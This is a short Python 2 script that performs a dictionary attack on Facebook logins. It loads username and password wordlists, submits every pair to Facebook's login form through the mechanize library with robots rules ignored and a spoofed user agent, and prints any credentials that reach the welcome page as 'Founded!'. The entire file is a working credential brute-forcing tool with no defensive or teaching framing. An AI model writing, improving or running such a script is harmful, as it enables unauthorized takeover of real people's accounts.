import sys

end = '\033[0m'
yellow = '\033[33m'
red="\033[0;31m"
green="\033[0;32m"
brown="\033[0;33m"
blue="\033[0;34m"
pur="\033[0;35m" 

def __start__():
	try:
		import mechanize
	except ImportError:
		print
		print red+"[+] Not found 'mechanize' library"+end
		print green+"    pip install mechanize"+end
		print
		sys.exit()
	print
	print green+"[+] Please enter username file"
	print "    e.x: user.txt"+end
	print
	user = raw_input(brown+"facebook > user >>> "+end)
	print
	print green+"[+] Please enter password file"
	print "    e.x: pass.txt"+end
	print
	passwd = raw_input(brown+"facebook > pass >>> "+end)
	try:
		userOPEN = open(user, "r")
		userWORD = userOPEN.readlines()
		userOPEN.close()
	except IOError:
		print
		print red+"[-] Not found user file: "+user+end
		print
		sys.exit()
	try:
		passOPEN = open(passwd, "r")
		passWORD = passOPEN.readlines()
		passOPEN.close()
	except IOError:
		print
		print red+"[-] Not found pass file: "+passwd+end
		print
		sys.exit()
		
	for username in userWORD:
		username = username.strip()
		for password in passWORD:
			password = password.strip()

			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.addheaders = [("User-agent", 'Firefox')]
			br.open("https://www.facebook.com/login.php")
			br.select_form(nr=0)
			br.form['email'] = username
			br.form['pass'] = password
			sub = br.submit()
			subURL = sub.geturl()
			
			if subURL == "https://www.facebook.com/?sk=welcome":
				print
				print green+"[+] Founded!"+end
				print
				print brown+" username: "+green+username+end
				print brown+" password: "+green+password+end
				print
				raw_input(brown+'facebook > Please Press enter to continue Dictionary attack ...'+end)
			else:
				print red+"Try: "+end
				print red+"    username: ",brown,username,end
				print red+"    password: ",brown,password,end





